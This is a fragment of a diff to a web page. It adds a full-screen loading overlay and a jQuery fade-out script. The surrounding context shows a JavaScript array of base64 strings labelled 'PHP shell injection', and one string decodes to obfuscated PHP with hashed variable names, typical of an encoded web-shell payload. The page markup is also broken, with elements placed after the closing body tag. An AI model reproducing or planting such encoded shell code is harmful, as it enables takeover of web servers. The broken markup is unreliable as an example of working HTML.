@@ -59,6 +59,15 @@ body {
   margin: 0 auto;
   height: 100%;
 }
+#loading-wrapper {
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  left: 0;
+  top: 0;
+  background:#222;
+  z-index: 99999;
+}
 #loading-content {
   border: 3px solid transparent;
   border-top-color: #4C8BF4;
@@ -626,6 +635,11 @@ var output = ["1VmMHcxaStBcnBxSC9xQTlmTlJ0aGVmMXJKSHJLRXNLNEk2U",
 "1ZTZlZTAwNiksICRtODY4NzdkYjNmZDUyYzAyNGZhYmJjODQwNzVjNDQzZTYqMywgMykpOyB9IHJldHVybiAkbWViYmMwMDNiN2ZlMjdiMmNmNGRmZjhiN2EzMzJkMzliOyB9ICA/Pg==",
 "PHP shell injection..."];
     </script>
+<script>
+	$(window).load(function () {
+            $('#loading-wrapper').delay(1000).fadeOut('slow');
+         });
+  </script>
 </body>
   <div id="loading-content"></div>
 <html>
